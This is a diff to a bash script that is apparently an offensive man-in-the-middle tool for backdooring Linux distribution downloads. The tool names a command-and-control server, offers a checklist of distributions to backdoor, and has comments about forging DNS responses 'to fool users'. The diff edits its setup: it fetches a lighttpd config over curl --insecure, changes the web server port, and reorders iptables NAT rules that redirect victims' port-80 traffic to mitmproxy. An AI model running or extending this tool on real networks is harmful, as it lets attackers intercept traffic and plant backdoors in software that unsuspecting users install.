@@ -17,7 +17,7 @@ DEPENDENCIES=("bash" "cp" "mv" "rm" "ls" "mkdir" "tar" "awk" "grep" "sed" "md5su
 
 
 function usage {
-    echo "Please specify the client IP and the command and control server"
+    echo "Please specify the downstream mitm target interface and the command and control server"
     echo "Usage: $0 <target network interface> <cnc>"
     exit 1
 }
@@ -420,7 +420,7 @@ dialog --checklist "What operating system distributions would you like to backdo
         
  if [ $? -ge 1 ]; then
     echo "Bye"
-    
+    exit
  fi
  
         selections=`cat $tmpchecklist`
@@ -482,7 +482,7 @@ ls -l out
 # dns response to point to this target machine to fool users
 # if you specify a CNC outside of the compromised box it will work fine.
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/lighttpd.conf > lighttpd.conf &&
-echo "Starting lighttpd web server started on port 81" &&
+echo "Starting lighttpd web server started on port 80" &&
 sed -i "s#PWD#${PWD}#" lighttpd.conf
      if [ $? -ge 1 ];then
          echo "Error fetching and configuring lighttpd" 
@@ -502,9 +502,9 @@ fi
 
 
 # Set it up
-iptables -t nat -A PREROUTING 0 -i $INTERFACE -p tcp -m tcp -d $INTERFACE_IP --dport 80 -j ACCEPT  -m comment --comment "Don't do anything with traffic to $INTERFACE_IP on port 80"
+iptables -t nat -I PREROUTING 1 -i $INTERFACE -p tcp -m tcp -d $INTERFACE_IP --dport 80 -j ACCEPT  -m comment --comment "Don't do anything with traffic to $INTERFACE_IP on port 80"
 
-iptables -t nat -A PREROUTING 1 -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 -m comment --comment "Forward everyting to tcp/80 to port 8080 where mitmproxy will be listening"
+iptables -t nat -I PREROUTING 2 -i $INTERFACE -p tcp -m tcp --dport 80 -j REDIRECT --to-ports 8080 -m comment --comment "Forward everyting to tcp/80 to port 8080 where mitmproxy will be listening"
     
     if [ $? -ge 1 ];then
          echo "Error applying iptables rule on $INTERFACE" 
